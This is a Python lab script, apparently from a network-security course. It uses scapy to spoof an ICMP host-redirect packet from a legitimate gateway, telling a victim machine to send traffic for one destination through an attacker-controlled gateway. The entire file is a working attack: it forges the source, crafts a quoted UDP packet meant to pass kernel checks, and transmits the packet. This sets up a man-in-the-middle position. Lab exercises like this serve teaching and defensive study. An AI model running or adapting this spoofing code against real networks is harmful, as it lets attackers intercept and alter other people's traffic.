#!/usr/bin/env python3
"""
Lab 05: ICMP Redirect Attack Script (Type 5, Code 1 - Host Redirect)
Spoofs an ICMP Redirect packet appearing to originate from legitimate gateway (10.0.0.1)
sent to victim (10.0.0.2), specifying a new gateway (10.0.0.66) for target destination (10.0.1.5).
"""
import sys
import time
from scapy.all import IP, ICMP, UDP, send

LEGIT_GW = "10.0.0.1"
VICTIM_IP = "10.0.0.2"
ATTACKER_GW = "10.0.0.66"
DEST_IP = "10.0.1.5"

print(f"[*] Crafting spoofed ICMP Redirect:")
print(f"    - From (Spoofed GW)  : {LEGIT_GW}")
print(f"    - To (Victim)        : {VICTIM_IP}")
print(f"    - Redirect Traffic To: {DEST_IP}")
print(f"    - New Gateway Address: {ATTACKER_GW}")

# The original IP packet that the victim allegedly sent to DEST_IP
# Note: Linux kernel 4.x-7.x validates 4-tuple matching against active sockets.
# Using UDP transport payload matching active application socket on victim.
orig = IP(src=VICTIM_IP, dst=DEST_IP) / UDP(sport=12345, dport=80)

# ICMP Type 5 = Redirect, Code 1 = Redirect for Host
# gw field contains the IP of the recommended new router
redir = IP(src=LEGIT_GW, dst=VICTIM_IP) / ICMP(type=5, code=1, gw=ATTACKER_GW) / orig

send(redir, verbose=0)
print(f"[+] Spoofed ICMP Redirect successfully transmitted.")
